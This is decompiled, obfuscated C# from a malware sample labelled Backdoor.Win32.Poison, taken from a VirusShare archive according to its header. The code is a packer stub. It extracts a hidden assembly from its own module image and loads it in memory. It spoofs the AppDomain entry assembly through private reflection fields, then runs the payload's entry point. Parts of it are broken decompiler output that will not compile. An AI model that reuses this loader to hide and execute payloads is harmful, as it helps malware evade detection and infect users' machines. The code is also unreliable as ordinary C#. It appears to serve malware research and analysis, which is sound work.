// Decompiled with JetBrains decompiler
// Type: õ.ê
// Assembly: WindowsApplication1, Version=8.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: ED46BCEB-CED4-40B1-868F-E45B7BFC7B90
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Poison.aec-9345a1ab8f180f6137cf2175af139e78e5c5dd900afb0b82476f38087b658b70.exe

using \u0083õ;
using \u0083û;
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0083õ
{
  [Serializable]
  internal class \u0083ê
  {
    private IntPtr \u0082\u00AF;
    private IntPtr \u0082\u00AB;
    private int \u0082\u00A9;
    private Assembly \u0081\u00A5;

    private unsafe Assembly \u0081Ä()
    {
      byte* numPtr = (byte*) \u0083ú.\u0082\u008B((byte*) this.\u0082\u00AF.ToPointer());
      if ((IntPtr) numPtr == IntPtr.Zero)
        return (Assembly) null;
      IntPtr ptr = (IntPtr) (void*) numPtr;
      int length1 = Marshal.ReadInt32(ptr);
      IntPtr source = (IntPtr) (void*) (numPtr + 4);
      byte[] rawAssembly = new byte[length1];
      byte[] destination = rawAssembly;
      int length2 = length1;
      Marshal.Copy(source, destination, 0, length2);
      Assembly assembly = Assembly.Load(rawAssembly);
      Marshal.FreeCoTaskMem(ptr);
      return assembly;
    }

    private unsafe Assembly \u0082Å()
    {
      byte* numPtr = (byte*) \u0083ú.\u0082\u0093((byte*) this.\u0082\u00AF.ToPointer());
      if ((IntPtr) numPtr == IntPtr.Zero)
        return (Assembly) null;
      IntPtr ptr = (IntPtr) (void*) numPtr;
      string stringAnsi = Marshal.PtrToStringAnsi(ptr);
      Marshal.FreeCoTaskMem(ptr);
      Assembly assembly = (Assembly) null;
      try
      {
        assembly = Assembly.Load(stringAnsi);
      }
      catch (Exception ex)
      {
      }
      return assembly;
    }

    public static unsafe int ß(Assembly _param0, int _param1)
    {
      // ISSUE: untyped stack allocation
      int num1 = (int) __untypedstackalloc(\u0083ú.\u0081û());
      IntPtr hinstance = Marshal.GetHINSTANCE(_param0.GetLoadedModules()[0]);
      int num2 = 0;
      \u0083ê ê = new \u0083ê();
      ê.\u0081\u00A5 = _param0;
      ê.\u0082\u00AF = hinstance;
      ê.\u0082\u00A9 = _param1;
      IntPtr num3 = (IntPtr) (void*) &num2;
      ê.\u0082\u00AB = num3;
      AppDomain domain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
      int id = domain.Id;
      domain.AssemblyResolve += new ResolveEventHandler(\u0083ê.\u0082\u00B4);
      CrossAppDomainDelegate callBackDelegate = new CrossAppDomainDelegate(ê.\u0081\u00B6);
      domain.DoCallBack(callBackDelegate);
      try
      {
        AppDomain.Unload(domain);
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        uint exceptionCode = (uint) Marshal.GetExceptionCode();
        if (\u0083ú.\u0081í((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num4 = 0;
        \u0083ú.\u0081ô((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num4 = (uint) \u0083ú.\u0081\u0092((void*) Marshal.GetExceptionPointers());
            if (num4 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_10;
          if (num4 != 0U)
            throw;
        }
        finally
        {
          \u0083ú.\u0081\u009F((void*) num1, (int) num4);
        }
      }
label_10:
      \u0083ú.\u0082\u0098();
      \u0083ú.\u0082\u0085(id);
      return num2;
    }

    public unsafe void \u0081\u00B6()
    {
      FieldInfo fieldInfo = (FieldInfo) null;
      // ISSUE: untyped stack allocation
      int num1 = (int) __untypedstackalloc(\u0083ú.\u0081û());
      Assembly entryAssembly = Assembly.GetEntryAssembly();
      uint exceptionCode;
      if (entryAssembly == (Assembly) null)
      {
        \u0083ö.\u0082ö = this.\u0081\u00A5;
        try
        {
          fieldInfo = (FieldInfo) null;
          AppDomain currentDomain = AppDomain.CurrentDomain;
          AppDomainManager appDomainManager = currentDomain.DomainManager;
          if (appDomainManager == null)
          {
            appDomainManager = new AppDomainManager();
            FieldInfo field = typeof (AppDomain).GetField("_domainManager", BindingFlags.Instance | BindingFlags.NonPublic);
            if (field != (FieldInfo) null)
              field.SetValue((object) currentDomain, (object) appDomainManager);
          }
          FieldInfo field1 = typeof (AppDomainManager).GetField("m_entryAssembly", BindingFlags.Instance | BindingFlags.NonPublic);
          if (field1 != (FieldInfo) null)
            field1.SetValue((object) appDomainManager, (object) entryAssembly);
        }
        catch (Exception ex1) when (
        {
          // ISSUE: unable to correctly present filter
          exceptionCode = (uint) Marshal.GetExceptionCode();
          if (\u0083ú.\u0081í((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          uint num2 = 0;
          \u0083ú.\u0081ô((void*) Marshal.GetExceptionPointers(), (void*) num1);
          try
          {
            try
            {
            }
            catch (Exception ex2) when (
            {
              // ISSUE: unable to correctly present filter
              num2 = (uint) \u0083ú.\u0081\u0092((void*) Marshal.GetExceptionPointers());
              if (num2 != 0U)
              {
                SuccessfulFiltering;
              }
              else
                throw;
            }
            )
            {
            }
            goto label_18;
            if (num2 != 0U)
              throw;
          }
          finally
          {
            \u0083ú.\u0081\u009F((void*) num1, (int) num2);
          }
        }
      }
      else
        \u0083ö.\u0082ö = entryAssembly;
label_18:
      Assembly assembly = (Assembly) null;
      switch (this.\u0082\u00A9 & 805306368)
      {
        case 536870912:
          assembly = this.\u0082Å();
          break;
        case 805306368:
          assembly = this.\u0081Ä();
          break;
      }
      if (assembly == (Assembly) null)
        return;
      MethodInfo entryPoint = assembly.EntryPoint;
      if (entryPoint == (MethodInfo) null)
        return;
      object[] parameters = new object[0];
      if (entryPoint.GetParameters().Length != 0)
      {
        string[] commandLineArgs = Environment.GetCommandLineArgs();
        string[] destinationArray = new string[commandLineArgs.Length - 1];
        int length = destinationArray.Length;
        if (length != 0)
          Array.Copy((Array) commandLineArgs, 1, (Array) destinationArray, 0, length);
        parameters = new object[1]
        {
          (object) destinationArray
        };
      }
      object obj = entryPoint.Invoke((object) null, parameters);
      if (obj == null)
        return;
      try
      {
        Marshal.WriteInt32(this.\u0082\u00AB, Convert.ToInt32(obj));
      }
      catch (Exception ex3) when (
      {
        // ISSUE: unable to correctly present filter
        exceptionCode = (uint) Marshal.GetExceptionCode();
        if (\u0083ú.\u0081í((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num3 = 0;
        \u0083ú.\u0081ô((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex4) when (
          {
            // ISSUE: unable to correctly present filter
            num3 = (uint) \u0083ú.\u0081\u0092((void*) Marshal.GetExceptionPointers());
            if (num3 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          return;
          if (num3 == 0U)
            return;
          throw;
        }
        finally
        {
          \u0083ú.\u0081\u009F((void*) num1, (int) num3);
        }
      }
    }

    public static Assembly \u0082\u00B4(object _param0, ResolveEventArgs _param1) => \u0083ú.ò(_param1.Name);
  }
}
